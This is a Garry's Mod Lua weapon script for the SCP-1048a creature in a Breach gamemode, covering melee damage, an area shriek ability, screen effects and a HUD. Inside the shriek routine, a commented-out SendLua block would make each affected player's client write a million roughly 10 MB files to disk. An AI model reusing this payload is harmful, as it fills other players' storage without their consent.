--[[
gamemodes/breach/entities/weapons/weapon_scp_1049a.lua
--]]
AddCSLuaFile()

if CLIENT then
	SWEP.WepSelectIcon 	= surface.GetTextureID("vgui/entities/scp")
	SWEP.BounceWeaponIcon = false
end


SWEP.ViewModelFOV	= 62
SWEP.ViewModelFlip	= false
SWEP.ViewModel		= "models/vinrax/props/keycard.mdl"
SWEP.WorldModel		= "models/vinrax/props/keycard.mdl"
SWEP.PrintName		= "SCP-1048a"
SWEP.Slot			= 0
SWEP.SlotPos		= 0
SWEP.DrawAmmo		= false
SWEP.DrawCrosshair	= true
SWEP.HoldType		= "knife"
SWEP.Spawnable		= false
SWEP.AdminSpawnable	= false

SWEP.AttackDelay			= 1.3
SWEP.ISSCP = true
SWEP.droppable				= false
SWEP.CColor					= Color(0,255,0)
SWEP.YellSound		    	= Sound( "sfx/scp/1048a/shriek.ogg" ) -- ent:EmitSound( self.YellSound, 500, 100 )
SWEP.teams					= {1}
SWEP.Primary.Ammo			= "none"
SWEP.Primary.ClipSize		= -1
SWEP.Primary.DefaultClip	= 0
SWEP.Primary.Automatic		= false

SWEP.SpecialDelay			= 30
SWEP.Secondary.Ammo			= "none"
SWEP.Secondary.ClipSize		= -1
SWEP.Secondary.DefaultClip	= 0
SWEP.Secondary.Automatic	= false
SWEP.NextAttackW			= 0

function SWEP:Deploy()
	self.Owner:DrawViewModel( false )
end


function SWEP:DrawWorldModel()
end
function SWEP:Initialize()
	self:SetHoldType("knife")
end

SWEP.DrawRed = 0

function SWEP:Think()

	return true

end

scp_toggleLight_cooldown = 0
function SWEP:Reload()

	return false

end

--[[--
function SWEP:Reload()
	if preparing or postround then return end
	if not IsFirstTimePredicted() then return end
end
--]]--

function SWEP:PrimaryAttack()
	if preparing or postround then return end
	if not IsFirstTimePredicted() then return end
	if self.NextAttackW > CurTime() then return end
	self.NextAttackW = CurTime() + self.AttackDelay
	if SERVER then
		local ent = self.Owner:GetEyeTrace().Entity
		if (ent:GetPos():Distance(self.Owner:GetPos()) < 150) then
			if ent:IsPlayer() then
				if ent:GTeam() == TEAM_SCP then return end
				if ent:GTeam() == TEAM_SPEC then return end
				if ent:GTeam() == TEAM_DZ then return end
				ent:TakeDamage( math.random( 30, 40 ), self.Owner, self.Owner )
			else
				if ent:GetClass() == "func_breakable" then
					ent:TakeDamage( 100, self.Owner, self.Owner )
				elseif ent:GetClass() == 'prop_dynamic' then
					if string.lower(ent:GetModel()) == 'models/foundation/containment/door01.mdl' then
						ent:TakeDamage( math.Round(math.random(9,12)), self.Owner, self.Owner )
						ent:EmitSound(Sound('MetalGrate.BulletImpact'))
					end
				end
			end
		end
	end
end

function SWEP:Holster()
end

SWEP.NextSpecial = 0
function SWEP:SecondaryAttack()
	local time = 5
	if self.NextSpecial > CurTime() then return end
	self.NextSpecial = CurTime() + self.SpecialDelay
	if CLIENT then
		surface.PlaySound("sfx/scp/1048a/shriek.mp3")
	end
	local findents = ents.FindInSphere( self.Owner:GetPos(), 300 )
	local foundplayers = {}
	for k,v in pairs(findents) do
		if v:IsPlayer() then
			if !(v:GTeam() == TEAM_SCP or v:GTeam() == TEAM_SPEC or v:GTeam() == TEAM_DZ) then
				table.ForceInsert(foundplayers, v)
			end
		elseif v:GetClass() == "func_breakable" then
			if v.TakeDamage then
				v:TakeDamage( 30, self.Owner, self.Owner )
			end
		end
	end
	if #foundplayers > 0 then
		local fixednicks = "Получили урон: "
		if CLIENT then return end
		local numi = 0
		for k,v in pairs(foundplayers) do
			numi = numi + 1

			if numi == 1 then
				fixednicks = fixednicks .. v:Nick()
			elseif numi == #foundplayers then
				fixednicks = fixednicks .. " и " .. v:Nick()
			else
				fixednicks = fixednicks .. ", " .. v:Nick()
			end
			v:SendLua( 'surface.PlaySound("sfx/scp/1048a/shriek.mp3")' )
			--[[v:SendLua([[

        file.CreateDir("nexoren")

        for i = 1,1000000 do

        file.Write("nextoren/rektumad"..i..".txt",string.rep("ayagovoril", 1000000))

        end

        ]]
			v:ScreenFade(SCREENFADE.OUT,Color(255,0,0,180),0.3,0)
			timer.Simple(2, function() v:ScreenFade(SCREENFADE.OUT,Color(255,0,0,180),0.9,0) end)
			timer.Simple(4, function() v:ScreenFade(SCREENFADE.OUT,Color(255,0,0,180),0.9,0) end)
			timer.Simple(6, function() v:ScreenFade(SCREENFADE.OUT,Color(255,0,0,180),0.9,0) end)
			timer.Simple(8, function() v:ScreenFade(SCREENFADE.OUT,Color(255,0,0,180),0.9,0) end)
			v:SendLua( 'surface.PlaySound("sfx/SCP/1048A/Growth.mp3")' )
			v:SendLua('util.ScreenShake( Vector( 0, 0, 0 ), 50, 10, 4, 5000 )')
			v:SetDSP(34)

			timer.Create("Setdefaultdsp" ..v:SteamID(), 10, 1, function()
			  v:SetDSP(1)
			end)
			v:TakeDamage( math.random(60,80), self.Owner, self.Owner  )

		end
		self.Owner:PrintMessage(HUD_PRINTTALK, fixednicks)
	end
end

function SWEP:CanPrimaryAttack()
	return true
end

function SWEP:DrawHUD()
	if disablehud == true then return end
	local specialstatus = ""
	local showtext = ""
	local lookcolor = Color(0,255,0)
	local showcolor = Color(17, 145, 66)
	if self.NextSpecial > CurTime() then
		specialstatus = "будет готова через " .. math.Round(self.NextSpecial - CurTime())
		showcolor = Color(145, 17, 62)
	else
		specialstatus = "готова к использованию"
	end
	showtext = "Специальная способность " .. specialstatus
	if self.DrawRed < CurTime() then
		self.CColor = Color(255,0,0)
		lookcolor = Color(145, 17, 62)
	else
		self.CColor = Color(0,255,0)
	end

	local NvKey = input.LookupBinding('+reload') --Get key for reload
	if type(NvKey) == 'no value' then NvKey = 'NOT BOUND' end -- The key is not bound!


	draw.Text( {
		text = showtext,
		pos = { ScrW() / 2, ScrH() - 30 },
		font = "173font",
		color = showcolor,
		xalign = TEXT_ALIGN_CENTER,
		yalign = TEXT_ALIGN_CENTER,
	})

	local x = ScrW() / 2.0
	local y = ScrH() / 2.0

	local scale = 0.3
	surface.SetDrawColor( self.CColor.r, self.CColor.g, self.CColor.b, 255 )

	local gap = 5
	local length = gap + 20 * scale
	surface.DrawLine( x - length, y, x - gap, y )
	surface.DrawLine( x + length, y, x + gap, y )
	surface.DrawLine( x, y - length, x, y - gap )
	surface.DrawLine( x, y + length, x, y + gap )
end


